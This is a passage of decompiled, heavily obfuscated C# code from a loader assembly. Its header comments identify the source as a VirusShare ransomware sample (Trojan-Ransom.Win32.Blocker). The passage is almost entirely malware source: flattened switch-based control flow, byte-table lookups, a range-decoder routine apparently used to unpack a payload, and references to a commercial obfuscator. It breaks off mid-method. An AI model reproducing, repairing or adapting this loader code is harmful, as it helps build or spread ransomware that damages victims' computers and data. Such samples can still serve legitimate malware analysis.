// Decompiled with JetBrains decompiler
// Type: Ⴍ.ႷႣ
// Assembly: jizbwcwvchLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B60D9367-1A45-4565-96B0-53F2CD92A512
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.bdzb-39b748d8a4dd59a65e8a25c296dfc3aa1df8ddf8.exe

using Evaluation;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace Ⴍ
{
  internal sealed class ႷႣ
  {
    public uint Ⴀ;
    public uint Ⴈ;
    public Stream Ⴃ;

    public ႷႣ() => ႷႣ.Ⴓ();

    public void ႨႠ([In] Stream obj0)
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
      byte[] ⴍ = \u0003\u2002.Ⴍ;
      int num1 = 5;
      int num2;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 6:
          case 7:
            ++num2;
            num1 = 4;
            continue;
          case 1:
          case 3:
            this.Ⴈ = this.Ⴈ << 8 | (uint) (byte) ႷႣ.ႠႤ(this.Ⴃ, (short) 171, '£');
            num1 = 0;
            continue;
          case 2:
            goto label_6;
          case 4:
            num1 = num2 < 5 ? 3 : (int) ⴍ[123];
            continue;
          default:
            this.Ⴃ = obj0;
            this.Ⴈ = 0U;
            this.Ⴀ = uint.MaxValue;
            num2 = 0;
            num1 = (int) ⴗ[43] / 8;
            continue;
        }
      }
label_6:;
    }

    public void ႭႣ() => this.Ⴃ = (Stream) null;

    public uint ႨႨ([In] int obj0)
    {
      byte[] ⴍ = \u0003\u2002.Ⴍ;
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
      uint ⴀ = this.Ⴀ;
      uint num1 = this.Ⴈ;
      uint num2 = 0;
      int num3 = obj0;
      int num4 = 0;
      uint num5;
      while (true)
      {
        switch (num4)
        {
          case 0:
            num4 = num3 > 0 ? (int) ⴍ[123] * 3 : (int) ⴍ[223] - 117;
            continue;
          case 1:
          case 7:
          case 8:
            ⴀ <<= 8;
            num4 = (int) ⴗ[71] - 55;
            continue;
          case 2:
          case 12:
            goto label_11;
          case 3:
            goto label_3;
          case 5:
            int num6 = (int) num1;
            int num7 = (int) ⴀ;
            int num8 = (int) num5;
            \u0003\u2002.Ⴍ[288] = (byte) (((int) \u0003\u2002.Ⴍ[288] ^ obj0) & 108);
            int num9 = num8 - 1;
            int num10 = num7 & num9;
            num1 = (uint) (num6 - num10);
            num2 = (uint) ((int) num2 << 1 | 1 - (int) num5);
            num4 = 10;
            continue;
          case 6:
            ⴀ >>= 1;
            num5 = num1 - ⴀ >> 31;
            num4 = (int) ⴍ[198] - 101;
            continue;
          case 9:
            num1 = num1 << 8 | (uint) (byte) ႷႣ.ႠႤ(this.Ⴃ, (short) 298, 'Ģ');
            num4 = (int) ⴗ[82];
            continue;
          case 10:
            num4 = ⴀ >= 16777216U ? (int) ⴗ[8] - 157 : (int) ⴗ[114] - (int) ⴗ[50];
            continue;
          case 11:
            --num3;
            num4 = 0;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႣ.ႨႨ);
            num4 = 3;
            continue;
        }
      }
label_11:
      this.Ⴀ = ⴀ;
      this.Ⴈ = num1;
      return num2;
    }

    static ႷႣ() => \u0006.Ⴀ();

    internal static string Ⴀ()
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      \u0006.ႭႭ(198, '»').SetData(\u000E.Ⴓ(2088295583, 0, 2L, (byte) 16), (object) null);
label_4:
      int num1 = (int) ⴍ[7];
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 4:
            goto label_3;
          case 1:
            goto label_5;
          case 2:
            goto label_4;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႣ.Ⴀ);
            int num2 = (int) ⴗ[66];
            int num3 = (int) ⴗ[130];
            \u0003\u2002.Ⴍ[368] = (byte) (((int) \u0003\u2002.Ⴍ[368] | (int) \u0003\u2002.Ⴍ[550]) & 89);
            num1 = num2 - num3;
            continue;
        }
      }
label_5:
      return (string) null;
    }

    internal static Type Ⴗ()
    {
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      int num1 = 1970;
      int num2 = num1;
      int num3 = (num2 * num2 + num1) % 2 == 0 ? 5 : 4;
      while (true)
      {
        switch (num3)
        {
          case 0:
          case 1:
          case 2:
            goto label_6;
          case 3:
          case 6:
            goto label_3;
          case 4:
            num3 = 2;
            continue;
          case 5:
            ႷႣ.Ⴗ();
            num3 = (int) ⴍ[123];
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႣ.Ⴗ);
            num3 = 3;
            continue;
        }
      }
label_6:
      return typeof (Ⴍ.Ⴜ.Ⴀ);
    }

    internal static object Ⴍ()
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
      int num = 305 < 915 / 3 - 177 ? (int) ⴗ[67] - 2 : (int) ⴗ[33] - 63;
      while (true)
      {
        switch (num)
        {
          case 0:
            goto label_5;
          case 2:
          case 6:
            goto label_3;
          case 5:
            ႷႣ.Ⴍ();
            num = 0;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႣ.Ⴍ);
            num = 2;
            continue;
        }
      }
label_5:
      return (object) null;
    }

    internal static long Ⴄ()
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      int index = 0;
      Array array = (Array) \u0003.Ⴐ(\u0006.ႭႭ(170, 'Ô'), \u000E.Ⴓ(2088295578, 5, 8L, (byte) 30), 416, (short) 407);
      int num1 = (int) ⴗ[150] - (int) ⴗ[121];
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = ((byte[]) array)[index] < (byte) 29 ? 14 : (int) ⴍ[146];
            continue;
          case 1:
            goto label_23;
          case 2:
            goto label_4;
          case 3:
            goto label_9;
          case 4:
            num1 = (byte) 29 == (array as byte[])[index] ? 20 : (int) ⴍ[42] - 227;
            continue;
          case 5:
            num1 = (byte) 8 == (array as byte[])[index] ? (int) ⴗ[48] : 18;
            continue;
          case 6:
            num1 = ((byte[]) array)[index] < (byte) 248 ? 21 : 9;
            continue;
          case 7:
            ++index;
            num1 = (int) ⴗ[36] - (int) ⴗ[36];
            continue;
          case 8:
            int num2 = index;
            Ⴍ.Ⴜ.Ⴗ[13] = (byte) ((int) Ⴍ.Ⴜ.Ⴗ[13] & (int) Ⴍ.Ⴜ.Ⴗ[149] & 121);
            index = num2 + 1;
            num1 = (int) ⴍ[509] - 198;
            continue;
          case 9:
            num1 = (byte) 248 == ((byte[]) array)[index] ? 1 : (int) ⴗ[15] - 75;
            continue;
          case 10:
            goto label_3;
          case 11:
            num1 = (byte) 208 == ((byte[]) array)[index] ? 7 : (int) ⴍ[252] - (int) ⴍ[399];
            continue;
          case 12:
          case 17:
          case 20:
            ++index;
            num1 = 6;
            continue;
          case 13:
            num1 = ((byte[]) array)[index] < (byte) 208 ? 3 : (int) ⴍ[20] - 237;
            continue;
          case 14:
            goto label_14;
          case 15:
            int num3 = (int) ႷႰ.Ⴍ();
            num1 = (int) ⴍ[11];
            continue;
          case 16:
          case 24:
            num1 = ((byte[]) array)[index] < (byte) 8 ? 2 : 5;
            continue;
          case 18:
            ႷႳ.Ⴄ();
            num1 = 8;
            continue;
          case 19:
            ႷႳ.Ⴄ();
            num1 = 7;
            continue;
          case 21:
            goto label_19;
          case 23:
            goto label_22;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႣ.Ⴄ);
            num1 = (int) ⴗ[120];
            continue;
        }
      }
label_4:
      return 7;
label_9:
      return 7;
label_14:
      return 1;
label_19:
      return 6;
label_22:
      \u0006.Ⴅ();
label_23:
      int num4 = index + 1;
      return 0;
    }

    internal static long Ⴈ()
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      int index = 0;
      object obj = (object) (byte[]) \u0003.Ⴐ(\u0006.ႭႭ(139, 'ô'), \u000E.Ⴓ(2088295579, 4, 11L, (byte) 20), 979, (short) 1003);
label_4:
      int num1 = (int) ⴗ[10] - 27;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_15;
          case 1:
            goto label_10;
          case 3:
            ႷႳ.Ⴃ();
            num1 = 13;
            continue;
          case 4:
          case 23:
            num1 = (obj as byte[])[index] < (byte) 248 ? 11 : (int) ⴗ[38] - 60;
            continue;
          case 5:
          case 12:
            ++index;
            num1 = 6;
            continue;
          case 6:
            num1 = ((byte[]) obj)[index] < (byte) 208 ? (int) ⴗ[82] : 20;
            continue;
          case 7:
            \u0003.Ⴀ();
            num1 = 24;
            continue;
          case 8:
            num1 = (byte) 29 == ((byte[]) obj)[index] ? 9 : 15;
            continue;
          case 9:
            ++index;
            num1 = 23;
            continue;
          case 10:
            goto label_4;
          case 11:
            goto label_20;
          case 13:
            ++index;
            num1 = (int) ⴍ[105];
            continue;
          case 14:
            num1 = (byte) 8 == (obj as byte[])[index] ? 12 : (int) ⴗ[135] - 111;
            continue;
          case 15:
            int num2 = (int) ႷႰ.Ⴅ();
            num1 = 9;
            continue;
          case 16:
            num1 = (obj as byte[])[index] < (byte) 29 ? 0 : 8;
            continue;
          case 17:
            goto label_3;
          case 18:
            goto label_5;
          case 19:
            \u0003.Ⴄ();
            num1 = (int) ⴗ[155] - (int) ⴗ[150];
            continue;
          case 20:
            num1 = (byte) 208 == (obj as byte[])[index] ? 13 : 3;
            continue;
          case 21:
            num1 = ((byte[]) obj)[index] < (byte) 8 ? 18 : 14;
            continue;
          case 22:
            num1 = (byte) 248 == (obj as byte[])[index] ? (int) ⴗ[122] - 136 : 7;
            continue;
          case 24:
            goto label_24;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႣ.Ⴈ);
            num1 = 17;
            continue;
        }
      }
label_5:
      return 14;
label_10:
      return 11;
label_15:
      return 12;
label_20:
      return 10;
label_24:
      int num3 = index + 1;
      return 10;
    }

    internal static long Ⴅ()
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      int index = 0;
      object obj = (object) (byte[]) \u0003.Ⴐ(\u0006.ႭႭ(339, 'Ǔ'), \u000E.Ⴓ(2088295577, 6, 13L, (byte) 26), 637, (short) 580);
      int num1 = 4;
      while (true)
      {
        switch (num1)
        {
          case 1:
          case 16:
            num1 = (byte) 29 == (obj as byte[])[index] ? 20 : (int) ⴗ[4] * 2;
            continue;
          case 2:
            int num2 = (int) ႷႰ.Ⴍ();
            num1 = (int) ⴗ[132] - 236;
            continue;
          case 3:
            goto label_19;
          case 4:
            num1 = (obj as byte[])[index] < (byte) 8 ? 24 : (int) ⴍ[550] / 9;
            continue;
          case 5:
            num1 = (byte) 8 == ((byte[]) obj)[index] ? 18 : (int) ⴗ[67];
            continue;
          case 7:
            num1 = (obj as byte[])[index] < (byte) 248 ? (int) ⴗ[15] - 95 : 19;
            continue;
          case 8:
          case 12:
            ++index;
            num1 = (int) ⴍ[433] - 4;
            continue;
          case 9:
            ႷႣ.Ⴗ();
            num1 = 13;
            continue;
          case 10:
            goto label_14;
          case 11:
            num1 = (obj as byte[])[index] < (byte) 208 ? (int) ⴗ[8] / 8 : 27;
            continue;
          case 13:
            goto label_28;
          case 14:
            num1 = (obj as byte[])[index] < (byte) 29 ? 10 : 1;
            continue;
          case 15:
            goto label_24;
          case 17:
            int num3 = (int) ႷႰ.Ⴍ();
            num1 = 12;
            continue;
          case 18:
            ++index;
            num1 = (int) ⴍ[399] / 5;
            continue;
          case 19:
            num1 = (byte) 248 == ((byte[]) obj)[index] ? 29 : (int) ⴍ[507];
            continue;
          case 20:
            ++index;
            num1 = 7;
            continue;
          case 21:
            goto label_9;
          case 22:
            \u0003.Ⴀ();
            num1 = (int) ⴗ[87] - 64;
            continue;
          case 23:
            num1 = (byte) 218 == ((byte[]) obj)[index] ? 13 : 9;
            continue;
          case 24:
            goto label_4;
          case 25:
            num1 = ((byte[]) obj)[index] < (byte) 218 ? 15 : (int) ⴗ[91] - 209;
            continue;
          case 26:
            \u0003.Ⴀ();
            num1 = (int) ⴍ[11];
            continue;
          case 27:
            num1 = (byte) 208 == ((byte[]) obj)[index] ? 12 : (int) ⴍ[91];
            continue;
          case 28:
            goto label_3;
          case 29:
            ++index;
            num1 = (int) ⴗ[64] - 134;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႣ.Ⴅ);
            num1 = (int) ⴗ[48] + 20;
            continue;
        }
      }
label_4:
      return 0;
label_9:
      return 5;
label_14:
      return 14;
label_19:
      return 13;
label_24:
      return 15;
label_28:
      int num4 = index + 1;
      return 1;
    }

    internal static byte Ⴃ()
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      int index = 0;
      Array array = (Array) \u0003.Ⴐ(\u0006.ႭႭ(959, '̾'), \u000E.Ⴓ(2088295581, 2, 6L, (byte) 17), 885, (short) 847);
      int num1 = (int) ⴗ[120];
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 2:
          case 4:
            goto label_4;
          case 1:
            int num2 = (int) ႷႰ.Ⴅ();
            num1 = (int) ⴍ[92] / 3;
            continue;
          case 3:
            num1 = (byte) 8 == ((byte[]) array)[index] ? 5 : 23;
            continue;
          case 5:
            ++index;
            num1 = 21;
            continue;
          case 6:
            ႷႳ.Ⴃ();
            num1 = 11;
            continue;
          case 7:
            goto label_9;
          case 8:
            goto label_3;
          case 9:
            goto label_14;
          case 10:
            num1 = ((byte[]) array)[index] < (byte) 8 ? 0 : 3;
            continue;
          case 11:
            goto label_23;
          case 12:
            num1 = (byte) 248 == (array as byte[])[index] ? 11 : (int) ⴗ[130] - 178;
            continue;
          case 13:
            goto label_19;
          case 14:
            ++index;
            num1 = (int) ⴗ[34] - 161;
            continue;
          case 15:
            num1 = (byte) 208 == (array as byte[])[index] ? (int) ⴗ[78] - 4 : (int) ⴍ[511] - (int) ⴍ[388];
            continue;
          case 16:
            ++index;
            num1 = (int) ⴍ[91];
            continue;
          case 17:
            num1 = ((byte[]) array)[index] < (byte) 29 ? (int) ⴗ[82] * 9 : (int) ⴗ[108] - 12;
            continue;
          case 18:
            num1 = (array as byte[])[index] < (byte) 248 ? 13 : 12;
            continue;
          case 19:
          case 21:
            num1 = ((byte[]) array)[index] < (byte) 208 ? (int) ⴍ[10] - (int) ⴍ[62] : 15;
            continue;
          case 22:
            num1 = (byte) 29 == (array as byte[])[index] ? (int) ⴍ[272] * 2 : 1;
            continue;
          case 23:
            \u0003.Ⴄ();
            num1 = 5;
            continue;
          case 24:
            ႷႰ.Ⴐ();
            num1 = 16;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႣ.Ⴃ);
            num1 = 8;
            continue;
        }
      }
label_4:
      return 10;
label_9:
      return 27;
label_14:
      return 16;
label_19:
      return 30;
label_23:
      int num3 = index + 1;
      return 23;
    }

    internal static Type Ⴓ()
    {
      byte[] ⴍ = \u0003\u2002.Ⴍ;
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
      int index = 0;
      object obj = (object) (byte[]) \u0003.Ⴐ(\u0006.ႭႭ(934, '̤'), \u000E.Ⴓ(2088295577, 6, 0L, (byte) 26), 655, (short) 692);
      int num1 = 9;
      while (true)
      {
        switch (num1)
        {
          case 0:
            ++index;
            num1 = 11;
            continue;
          case 1:
            num1 = ((byte[]) obj)[index] < (byte) 232 ? 16 : 5;
            continue;
          case 2:
            ++index;
            num1 = (int) ⴗ[18] - (int) ⴗ[149];
            continue;
          case 3:
            goto label_3;
          case 4:
            num1 = (obj as byte[])[index] < (byte) 248 ? 22 : (int) ⴍ[423];
            continue;
          case 5:
            num1 = (byte) 232 == ((byte[]) obj)[index] ? 18 : (int) ⴍ[80] - 95;
            continue;
          case 6:
            num1 = (obj as byte[])[index] < (byte) 33 ? 28 : 36;
            continue;
          case 7:
            ++index;
            goto case 17;
          case 9:
            num1 = (obj as byte[])[index] < (byte) 8 ? 24 : 33;
            continue;
          case 10:
            ႷႰ.Ⴈ();
            num1 = (int) ⴗ[4];
            continue;
          case 11:
            num1 = ((byte[]) obj)[index] < (byte) 29 ? 19 : 29;
            continue;
          case 12:
            ++index;
            num1 = 6;
            continue;
          case 13:
            ++index;
            num1 = 4;
            continue;
          case 14:
            goto label_24;
          case 15:
            \u0003.Ⴄ();
            num1 = (int) ⴗ[72];
            continue;
          case 16:
            goto label_35;
          case 17:
            num1 = 1;
            continue;
          case 18:
            goto label_39;
          case 19:
            goto label_14;
          case 20:
            ႷႳ.Ⴃ();
            num1 = 0;
            continue;
          case 21:
            num1 = ((byte[]) obj)[index] < (byte) 208 ? (int) ⴗ[80] - 21 : (int) ⴍ[533];
            continue;
          case 22:
            goto label_19;
          case 23:
            \u000E.Ⴄ();
            num1 = (int) ⴍ[118];
            continue;
          case 24:
            goto label_4;
          case 25:
            num1 = (byte) 248 == (obj as byte[])[index] ? (int) ⴗ[67] : 38;
            continue;
          case 26:
          case 29:
            num1 = (byte) 29 == (obj as byte[])[index] ? (int) ⴍ[142] - 203 : (int) ⴍ[556] - 73;
            continue;
          case 27:
            ++index;
            num1 = 21;
            continue;
          case 28:
            goto label_29;
          case 30:
          case 32:
            ႷႣ.Ⴗ();
            num1 = 12;
            continue;
          case 31:
            ႷႰ.Ⴐ();
            num1 = 18;
            continue;
          case 33:
            num1 = (byte) 8 == (obj as byte[])[index] ? (int) ⴍ[118] : 23;
            continue;
          case 34:
            goto label_9;
          case 35:
            num1 = (byte) 208 == (obj as byte[])[index] ? 0 : 20;
            continue;
          case 36:
            num1 = (byte) 33 == ((byte[]) obj)[index] ? (int) ⴗ[72] : (int) ⴍ[216] - 221;
            continue;
          case 37:
            num1 = (obj as byte[])[index] < (byte) 218 ? 14 : (int) ⴗ[6];
            continue;
          case 38:
            int num2 = (int) ႷႰ.Ⴅ();
            num1 = 2;
            continue;
          case 39:
            num1 = (byte) 218 == ((byte[]) obj)[index] ? 12 : (int) ⴗ[76] - 190;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႣ.Ⴓ);
            num1 = 3;
            continue;
        }
      }
label_4:
      return typeof (DeepSeaObfuscator);
label_9:
      return typeof (\u000F\u2001);
label_14:
      return typeof (\u0005\u2000.ႷႷ.ႷႣ);
label_19:
      return typeof (\u0003);
label_24:
      return typeof (Ⴍ.ႷႷ);
label_29:
      return typeof (\u0006\u2001);
label_35:
      return typeof (ႷႭ);
label_39:
      int num3 = index + 1;
      return typeof (Ⴍ.ႷႷ.ႷႭ);
    }

    internal static byte Ⴐ()
    {
      byte[] ⴍ = \u0003\u2002.Ⴍ;
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
      int index = 0;
      object obj = (object) (byte[]) \u0003.Ⴐ(\u0006.ႭႭ(727, 'ɔ'), \u000E.Ⴓ(2088295575, 8, 11L, (byte) 2), 207, (short) 243);
      int num1 = (int) ⴍ[112] + 2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_3;
          case 1:
            num1 = (byte) 29 == ((byte[]) obj)[index] ? 8 : (int) ⴍ[112];
            continue;
          case 2:
            ++index;
            num1 = 26;
            continue;
          case 3:
            goto label_40;
          case 4:
            \u0006.Ⴐ();
            num1 = 30;
            continue;
          case 5:
            num1 = (byte) 33 == (obj as byte[])[index] ? 2 : 41;
            continue;
          case 6:
            num1 = (byte) 106 == (obj as byte[])[index] ? 28 : 25;
            continue;
          case 7:
            ႷႣ.Ⴗ();
            num1 = (int) ⴗ[117] - 19;
            continue;
          case 8:
            ++index;
            num1 = (int) ⴗ[26] - 46;
            continue;
          case 9:
            num1 = ((byte[]) obj)[index] < (byte) 218 ? (int) ⴍ[582] - 107 : 31;
            continue;
          case 10:
            num1 = (obj as byte[])[index] < (byte) 29 ? 43 : 1;
            continue;
          case 11:
            goto label_4;
          case 12:
            ႷႳ.Ⴄ();
            num1 = 8;
            continue;
          case 13:
            goto label_20;
          case 14:
            num1 = (obj as byte[])[index] < (byte) 8 ? (int) ⴍ[369] : 35;
            continue;
          case 15:
            \u0003.Ⴄ();
            num1 = 20;
            continue;
          case 17:
            num1 = (obj as byte[])[index] < (byte) 33 ? (int) ⴗ[155] - 91 : 5;
            continue;
          case 18:
            num1 = (obj as byte[])[index] < (byte) 248 ? (int) ⴗ[4] : 21;
            continue;
          case 19:
          case 44:
            goto label_35;
          case 20:
            ++index;
            num1 = 34;
            continue;
          case 21:
            num1 = (byte) 248 == (obj as byte[])[index] ? 33 : (int) ⴗ[85];
            continue;
          case 22:
          case 36:
            num1 = (byte) 208 == (obj as byte[])[index] ? 30 : 4;
            continue;
          case 23:
            ႷႰ.Ⴐ();
            num1 = 42;
            continue;
          case 24:
            ++index;
            goto case 27;
          case 25:
            int num2 = (int) ႷႰ.Ⴅ();
            num1 = 28;
            continue;
          case 26:
            num1 = (obj as byte[])[index] < (byte) 232 ? 44 : 32;
            continue;
          case 27:
            num1 = 29;
            continue;
          case 28:
            goto label_44;
          case 29:
            num1 = ((byte[]) obj)[index] < (byte) 208 ? 37 : (int) ⴗ[76] - 184;
            continue;
          case 30:
            ++index;
            num1 = 10;
            continue;
          case 31:
            num1 = (byte) 218 == (obj as byte[])[index] ? (int) ⴗ[72] + 35 : (int) ⴍ[376] - 195;
            continue;
          case 32:
            num1 = (byte) 232 == ((byte[]) obj)[index] ? 20 : 15;
            continue;
          case 33:
            ++index;
            num1 = (int) ⴍ[53];
            continue;
          case 34:
            num1 = ((byte[]) obj)[index] < (byte) 106 ? (int) ⴗ[122] - 157 : (int) ⴍ[529] - (int) ⴍ[36];
            continue;
          case 35:
            num1 = (byte) 8 == ((byte[]) obj)[index] ? (int) ⴍ[196] - 190 : 7;
            continue;
          case 37:
            goto label_10;
          case 38:
            \u0005\u2000.Ⴍ();
            goto case 33;
          case 39:
            goto label_25;
          case 40:
            goto label_30;
          case 41:
            ႷႣ.Ⴀ();
            num1 = 2;
            continue;
          case 42:
            ++index;
            num1 = 17;
            continue;
          case 43:
            goto label_15;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႣ.Ⴐ);
            num1 = 0;
            continue;
        }
      }
label_4:
      return 28;
label_10:
      return 6;
label_15:
      return 22;
label_20:
      return 1;
label_25:
      return 31;
label_30:
      return 26;
label_35:
      return 12;
label_40:
      return 2;
label_44:
      int num3 = index + 1;
      return 23;
    }

    internal static int Ⴜ()
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      int index = 0;
label_4:
      object obj = (object) (byte[]) \u0003.Ⴐ(\u0006.ႭႭ(855, 'ϓ'), \u000E.Ⴓ(2088295579, 4, 9L, (byte) 8), 1009, (short) 972);
      int num1 = 0;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = (obj as byte[])[index] < (byte) 8 ? (int) ⴗ[4] : (int) ⴍ[272];
            continue;
          case 1:
            ႷႳ.Ⴃ();
            num1 = 3;
            continue;
          case 2:
            goto label_10;
          case 3:
            goto label_14;
          case 4:
            goto label_3;
          case 5:
            ++index;
            int num2 = (int) ⴍ[191];
            Ⴍ.Ⴜ.Ⴗ[34] = \u0003\u2002.Ⴍ[143];
            num1 = num2 - 46;
            continue;
          case 6:
            num1 = (obj as byte[])[index] < (byte) 208 ? (int) ⴍ[80] - 124 : (int) ⴍ[112];
            continue;
          case 7:
          case 9:
            num1 = (byte) 8 == (obj as byte[])[index] ? 5 : (int) ⴗ[59] - 18;
            continue;
          case 8:
          case 11:
            \u0003.Ⴄ();
            num1 = 5;
            continue;
          case 10:
            goto label_4;
          case 12:
            num1 = (byte) 208 == ((byte[]) obj)[index] ? (int) ⴗ[11] - 107 : (int) ⴍ[7];
            continue;
          case 13:
            goto label_5;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႣ.Ⴜ);
            num1 = (int) ⴗ[116] / 7;
            continue;
        }
      }
label_5:
      return 3;
label_10:
      return 3;
label_14:
      int num3 = index + 1;
      return 1;
    }

    internal static Type ႷႠ()
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      int index = 0;
      object obj = (object) (byte[]) \u0003.Ⴐ(\u0006.ႭႭ(35, '¦'), \u000E.Ⴓ(2088295576, 7, 9L, (byte) 17), 523, (short) 565);
label_4:
      int num1 = 6;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_18;
          case 1:
            num1 = (byte) 29 == (obj as byte[])[index] ? 18 : 0;
            continue;
          case 2:
            num1 = (byte) 208 == (obj as byte[])[index] ? 14 : 11;
            continue;
          case 4:
          case 6:
            num1 = (obj as byte[])[index] < (byte) 8 ? (int) ⴗ[33] / 4 : (int) ⴗ[104] - (int) ⴗ[147];
            continue;
          case 5:
            num1 = (byte) 8 == ((byte[]) obj)[index] ? 12 : (int) ⴗ[4];
            continue;
          case 7:
            goto label_10;
          case 8:
            goto label_3;
          case 9:
          case 17:
            goto label_5;
          case 10:
            goto label_15;
          case 11:
            ႷႳ.Ⴃ();
            num1 = (int) ⴗ[155] - 117;
            continue;
          case 12:
            ++index;
            num1 = (int) ⴗ[24] - 77;
            continue;
          case 13:
            ႷႳ.Ⴃ();
            num1 = 12;
            continue;
          case 14:
            ++index;
            num1 = 19;
            continue;
          case 15:
            num1 = ((byte[]) obj)[index] < (byte) 208 ? (int) ⴍ[272] : 2;
            continue;
          case 16:
            goto label_4;
          case 18:
            goto label_19;
          case 19:
            num1 = ((byte[]) obj)[index] < (byte) 29 ? 10 : 1;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႣ.ႷႠ);
            num1 = (int) ⴗ[48];
            continue;
        }
      }
label_5:
      return typeof (\u0005\u2000.ႷႷ);
label_10:
      return typeof (ႷႰ);
label_15:
      return typeof (\u0005\u2000.ႷႷ);
label_18:
      \u0006.Ⴅ();
label_19:
      int num2 = index + 1;
      return typeof (Ⴍ.ႷႷ.ႷႭ);
    }

    internal static long ႷႷ()
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      int index = 0;
      object obj = (object) (byte[]) \u0003.Ⴐ(\u0006.ႭႭ(248, '~'), \u000E.Ⴓ(2088295579, 4, 4L, (byte) 15), 344, (short) 359);
label_4:
      int num1 = 28;
      while (true)
      {
        switch (num1)
        {
          case 1:
            goto label_35;
          case 2:
            num1 = (byte) 8 == (obj as byte[])[index] ? (int) ⴍ[53] : 4;
            continue;
          case 3:
            num1 = (byte) 208 == ((byte[]) obj)[index] ? (int) ⴍ[355] - 151 : 14;
            continue;
          case 4:
            ႷႳ.Ⴃ();
            num1 = 9;
            continue;
          case 5:
            ++index;
            goto case 33;
          case 6:
            goto label_3;
          case 7:
            num1 = (obj as byte[])[index] < (byte) 218 ? (int) ⴍ[548] - 217 : 31;
            continue;
          case 8:
            ႷႳ.Ⴃ();
            num1 = (int) ⴗ[85] - 33;
            continue;
          case 9:
            ++index;
            num1 = (int) ⴗ[120] + 3;
            continue;
          case 10:
            ++index;
            num1 = (int) ⴗ[16] / 7;
            continue;
          case 11:
            num1 = (byte) 248 == (obj as byte[])[index] ? 32 : 22;
            continue;
          case 12:
            goto label_34;
          case 13:
            num1 = (obj as byte[])[index] < (byte) 208 ? 34 : (int) ⴗ[172] - 163;
            continue;
          case 14:
            ႷႣ.Ⴀ();
            num1 = (int) ⴗ[43] - 3;
            continue;
          case 15:
          case 29:
            ++index;
            num1 = (int) ⴍ[422] - 191;
            continue;
          case 16:
            goto label_31;
          case 17:
            num1 = (byte) 33 == ((byte[]) obj)[index] ? 1 : (int) ⴍ[112];
            continue;
          case 18:
            num1 = (byte) 29 == (obj as byte[])[index] ? 5 : 8;
            continue;
          case 19:
            ႷႰ.Ⴐ();
            num1 = (int) ⴗ[120];
            continue;
          case 20:
            goto label_15;
          case 21:
            goto label_5;
          case 22:
            ႷႣ.Ⴗ();
            num1 = (int) ⴍ[459] / 4;
            continue;
          case 23:
            num1 = (obj as byte[])[index] < (byte) 29 ? (int) ⴗ[117] - 23 : (int) ⴗ[85] - 20;
            continue;
          case 24:
            goto label_4;
          case 25:
            num1 = ((byte[]) obj)[index] < (byte) 248 ? 30 : (int) ⴍ[229] - 87;
            continue;
          case 26:
            goto label_26;
          case 27:
            num1 = (obj as byte[])[index] < (byte) 33 ? (int) ⴍ[105] : (int) ⴍ[91];
            continue;
          case 28:
            num1 = ((byte[]) obj)[index] < (byte) 8 ? (int) ⴗ[16] / 9 : 2;
            continue;
          case 30:
            goto label_21;
          case 31:
            num1 = (byte) 218 == (obj as byte[])[index] ? (int) ⴍ[143] - (int) ⴍ[0] : (int) ⴍ[142] - 197;
            continue;
          case 32:
            ++index;
            num1 = (int) ⴗ[72];
            continue;
          case 33:
            num1 = 25;
            continue;
          case 34:
            goto label_10;
          default:
            // ISSUE: method reference
